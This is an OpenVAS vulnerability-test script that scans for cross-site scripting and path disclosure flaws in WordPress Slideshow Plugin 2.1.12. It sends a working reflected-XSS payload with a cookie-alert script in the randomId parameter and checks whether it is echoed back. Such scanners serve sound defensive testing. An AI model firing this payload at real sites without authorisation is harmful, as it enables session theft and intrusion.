###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_slideshow_plugin_mult_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# WordPress Slideshow Plugin Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site and
  to gain sensitive information like installation path location.
  Impact Level: Application";
tag_affected = "WordPress Slideshow Plugin version 2.1.12";
tag_insight = "- Input passed via the 'randomId', 'slides' and 'settings' parameters
    to views/SlideshowPlugin/slideshow.php, 'settings', 'inputFields'
    parameters to views/SlideshowPluginPostType/settings.php and
    views/SlideshowPluginPostType/style-settings.php is not properly
    sanitised before being returned to the user.
  - Direct request to the multiple '.php' files reveals the full installation
    path.";
tag_solution = "No solution or patch is available as of 18th October, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/slideshow-jquery-image-gallery/";
tag_summary = "This host is running WordPress Slideshow Plugin and is prone to cross site
  scripting and full path disclosure vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802999";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-18 12:07:20 +0530 (Thu, 18 Oct 2012)");
  script_name("WordPress Slideshow Plugin Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.waraxe.us/advisory-92.html");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Oct/97");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/524452/30/0/threaded");

  script_description(desc);
  script_summary("Check if WordPress Slideshow Plugin is prone to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
url = "";
dir = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct attack
url = dir + '/wp-content/plugins/slideshow-jquery-image-gallery/views/' +
      'SlideshowPlugin/slideshow.php?randomId="><script>alert(' +
      'document.cookie);</script>';

## Confirm exploit worked properly or not
if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<script>alert\(document.cookie\);</script>")){
  security_warning(port:port);
}
